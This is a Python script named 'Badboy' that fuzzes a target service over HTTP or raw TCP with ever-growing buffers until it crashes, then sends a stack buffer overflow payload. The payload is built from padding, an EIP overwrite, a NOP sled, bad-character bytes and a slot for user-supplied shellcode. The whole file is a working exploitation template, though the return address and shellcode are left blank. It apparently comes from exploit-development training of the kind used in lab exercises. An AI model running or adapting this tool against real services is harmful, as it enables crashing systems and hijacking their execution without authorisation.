#!/usr/env/python

import requests
import argparse
import socket
import time
import binascii

def parseArgs():
  args = argparse.ArgumentParser(description="Fuzz and Inject payloads for Buffer bufferOverflows")
  args.add_argument('--mode', help="Mode used during the execution of the script [fuzz, inject]")
  args.add_argument('-c', help="Type of connection to use during fuzzing [http, raw-tcp]")
  args.add_argument('IP', help="IP Address of the target to fuzz on")
  args.add_argument('Port', type=int, help="Port of the target service to fuzz on")
  return args.parse_args()

def checkValidOption(string, array, context):
  try:
    array.index(string)
    return string
  except:
    print ("[-] {0} is not a valid {1}".format(string, context))
    print ("[-] Valid {1} are {0}".format(array, context))
    exit()

class Buffer:
    __overflowSize = 100 # Size of the buffer in bytes
    __overflowSizeInc = 100 # Incremental value in bytes
    __bufferOverflow = 'A' * __overflowSize
    __bufferOffset = '' # 'B' * 4
    __eip = "CCCC" # Replace with a 32 bits address once EIP register is controlled
    __nopsled = "" * 8 # Replace with NOP instructions for padding ( "\x90" * 16 )
    __badchars = ( # All bad characters except \x00, filter them as you need
          ""
    )

    #__badchars = ( # All bad characters except \x00, filter them as you need
    #  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
    #  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
    #  "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
    #  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
    #  "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
    #  "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
    #  "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
    #  "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
    #  "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
    #  "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
    #  "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
    #  "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
    #  "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
    #  "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
    #  "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
    #  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
    #)

    __shellcode = ( # Put your generated shellcode here ↓
        ""
    )

    def __init__(self):
      return

    def incBufferOverflow(self):
      self.__overflowSize += self.__overflowSizeInc
      self.__bufferOverflow = 'A' * self.__overflowSize

    def getBufferSize(self):
      return self.__overflowSize + len(self.__bufferOffset) + len(self.__eip) + len(self.__nopsled) + (len(self.__badchars) if self.__shellcode == '' else len(self.__shellcode))
    
    def getOverflowSize(self):
      return self.__overflowSize
    
    def getNOPSize(self):
      return len(self.__nopsled)

    def getEIP(self):
      return self.__eip
    
    def getBufferOverflow(self):
      return self.__bufferOverflow
    
    def getBadchars(self):
      return self.__badchars
    
    def getBufferOffset(self):
      return self.__bufferOffset

    def getShellcode(self):
      return self.__shellcode
    
    def getBufferString(self):
      buffer = self.__bufferOverflow + self.__bufferOffset + self.__eip + self.__nopsled + (self.__badchars if self.__shellcode == '' else self.__shellcode)
      return bytes("OVERFLOW1 {0}".format(buffer), encoding='latin-1') # Change OVERFLOW1 with the Parameter or Argument preceding the buffer

class Connector:
  __connectionType = ['http', 'raw-tcp']
  __connection = ""
  __isConnected = False
  __sock = None
  __targetIP = ""
  __targetPort = 80
  # Variables below are for HTTP Post request and should be reviewed manually
  __targetURL = ""
  __headers = {
        	'Host': __targetIP,
        	'User-Agent': 'Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0',
        	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        	'Accept-Language': 'en-US,en;q=0.5',
        	'Referer': "{0}".format(__targetURL),
        	'Connection': 'close',
        	'Content-Type': 'application/x-www-form-urlencoded',
  }

  def __init__(self, connection, IP, Port):
    self.__connection = checkValidOption(connection, self.__connectionType, 'connection type')
    self.__sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    self.__targetIP = IP
    self.__targetPort = Port
    self.__targetURL = "http://{0}:{1}/login".format(self.__targetIP,str(self.__targetPort))
    print ("[+] Connection type selected: {0}".format(self.__connection))
    return

  def send(self, buffer):
    try: 
      if self.__connectionType[0] == self.__connection:
        requests.post(self.__targetURL,data=buffer, headers=self.__headers)
      elif self.__connectionType[1] == self.__connection:
        
        self.__sock.send(buffer)
        self.__sock.recv(1024)
    except:
      print ("\n[-] Cannot Connect to: {0}:{1} or service crashed".format(self.__targetIP,self.__targetPort))
      exit()
      return

  def connect(self):
    try:
      print("\r[+] Connecting to {0}:{1}".format(self.__targetIP,self.__targetPort), end="")
      if self.__connectionType[1] == self.__connection and not self.__isConnected:
        self.__sock.connect((self.__targetIP,self.__targetPort))
        self.__sock.recv(1024)
        self.__isConnected = True
    except:
      print("[-] Unable to connect to {0}:{1}".format(self.__targetIP,self.__targetPort))
      return

  def close(self,):
    if self.__connectionType[1] == self.__connection:
      self.__sock.close()
    return

class Badboy:
  __requestLatency = 5 # Time in second before sending another request  
  __modeType = ['fuzz', 'inject']
  __mode = ""
  __connector = object
  __buffer = object
  
  def __init__(self, connector, mode):
      self.__connector = connector
      self.__buffer = Buffer()
      self.__mode = checkValidOption(mode, self.__modeType, 'mode')
      return
  
  def start(self):
    if self.__modeType[0] == self.__mode:
      self.__fuzz()
    elif self.__modeType[1] == self.__mode:
      print ("[+] Overflow value set to : A x {0} bytes".format(str(self.__buffer.getOverflowSize())))
      print ("[+] EIP value set to : {0} ".format( binascii.hexlify(bytes(self.__buffer.getEIP().encode('latin-1')))))
      print ("[+] NOP instructions padding : {0} bytes".format(str(self.__buffer.getNOPSize())))
      print ("[+] Shellcode length : {0} bytes".format(len(self.__buffer.getShellcode())))
      self.__inject()
    return

  def __inject(self):
    self.__connector.connect()
    bufferSize = self.__buffer.getBufferSize() if self.__mode == self.__modeType[1] else self.__buffer.getOverflowSize()
    print ("\r[+] Sending Badboy buffer of : {0} bytes".format(str(bufferSize)), end="")
    self.__connector.send(self.__buffer.getBufferString())
    return

  def __fuzz(self):
    while True:     
      self.__inject()
      self.__buffer.incBufferOverflow()
      time.sleep(self.__requestLatency)

  def getMode(self):
    return self.__mode

def main():
  args = parseArgs()
  connector = Connector(args.c,args.IP,args.Port)
  fuzzer = Badboy(connector, args.mode)
  print ("[+] Starting Badboy in {0} mode".format(fuzzer.getMode()))
  fuzzer.start() 
  return

if __name__ == "__main__":
  main()
